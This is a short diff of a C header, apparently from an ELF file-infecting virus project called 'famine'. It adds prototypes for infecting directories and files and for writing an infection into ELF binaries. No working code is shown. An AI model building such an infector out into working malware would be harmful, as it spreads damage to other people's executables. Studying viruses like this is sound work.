@@ -37,8 +37,11 @@
 
 /* famine.c */
 void	infect(void);
-void	search_file_to_infect(char *path);
+void	infect_dir(char *path);
+void	infect_file(char *file);
+void	choose_infect(char *path);
 
+void	create_infection(void *dst, t_elf *elf, int nb_zero);
 int		get_size_needed(t_elf *elf, t_elf *virus_elf);
 
 /* padding.c */
